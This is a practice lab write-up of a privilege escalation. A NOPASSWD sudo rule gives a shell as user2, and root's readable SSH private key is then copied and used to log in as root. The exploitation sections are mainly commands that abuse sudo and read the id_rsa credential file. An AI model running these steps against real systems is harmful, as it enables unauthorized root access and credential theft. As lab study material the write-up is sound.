---
type: writeup
date: 2026-06-24
source: practice
category: privilege escalation
difficulty: easy
status: complete
tags:
  - bash
---

## Target

- SSH access to `user1` with a given password on 154.57.164.70:31681.

## Recon

- [SSH](glossary:ssh) into user1 with password1 (given) allowed me to see the list of commands I could run.
- `sudo -l` showed I could run `/bin/bash` as user2 without a password (NOPASSWD).
- Found I was given access to the `.ssh` folder inside user2, and that root's private key was readable from there.

## Vulnerability

- NOPASSWD `sudo` to user2, combined with a world-readable root SSH private key, lets a low-privilege user pivot straight to root.

## Exploitation

```bash
ssh user1@154.57.164.70 -p 31681
sudo -l                       # listing what all commands I am allowed to run
sudo -u user2 /bin/bash       # was allowed to run /bin/bash as user2
cd /home/user2
cat flag.txt                  # first flag acquired
cd /root/.ssh
cat id_rsa                    # copy id_rsa to local machine
```

## Privilege Escalation

- Copied root's `id_rsa` to my local machine and used it to authenticate directly as root.

```bash
#--- new terminal (local machine) ---#
ssh root@154.57.164.70 -p 31681 -i id_rsa
cd /root
cat flag.txt                  # second flag acquired
```

## Lessons Learned

**Delays**

- didn't know how to use the private key id_rsa to ssh into root.

**New tricks**

- `ssh -i id_rsa` uses the specific private key to authenticate us as a user into a remote server.
